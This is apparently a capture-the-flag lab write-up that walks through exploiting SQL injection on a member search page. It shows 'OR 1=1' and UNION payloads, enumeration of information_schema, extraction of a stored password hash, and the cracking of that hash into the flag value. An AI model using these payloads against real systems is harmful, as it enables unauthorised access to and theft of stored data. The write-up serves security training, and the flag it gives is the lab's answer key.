## 02 SQL from member search

### How did we approach
In Member searching page, they get user id to search user.

#### 1. Understand how it works
With `1`, I can see un user with id, 1.

With `a`, I got an error saying "Unknown column 'a' in 'where clause'"

It seems, they put user input directly to SQL query. 

With `105 OR 1=1`, I got all users!! 

**YEAH**

And one of the user is like below.

```
ID: 105 OR 1=1
First name: Flag
Surname : GetThe
```

#### 2. 시행착오 = trial and error
We are guessing sql will look like this.

```
SELECT first_name, last_name FROM Users WHERE ID = [USER INPUT]
```

We decided to user "union" to get other information from DB.

```
1 union select null, first_name, last_name from members
->
Table 'Member_Sql_Injection.members' doesn't exist
```
-> Table "members" doesn't exist.

```
1 UNION SELECT * FROM users --
->
The used SELECT statements have a different number of columns
```
-> We can't use 'union' with different number of columns of front part (which is 3)

```
1 UNION SELECT first_name, last_name FROM users
First name: Flag
Surname : GetThe
```
-> Alright! This works. But we don't get any useful information.

```
1 UNION SELECT password, last_name FROM users
->
Unknown column 'password' in 'field list'
```
-> :/

#### 3. information_schema
Get schema names from [schemata](https://dev.mysql.com/doc/refman/8.4/en/information-schema-schemata-table.html)

```
ID: 1 union select schema_name, null from information_schema.schemata
First name: Member_Sql_Injection
Surname :
```

Get column names and table names

```
ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: Commentaire
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: countersign
Surname : users

```
We can see there are "Commentaire" and "countersign" in "users" table. Let's take a look.

```
ID: 1 UNION SELECT commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

#### 4. Decoding & encoding
Let's do it.

1. Decode "5ff9d0165b4f92b14994e5c685cdce28" with 'MD5' -> "FortyTwo"

2. Encode `fortytwo` with 'sh256' -> "10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"
FLAG: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
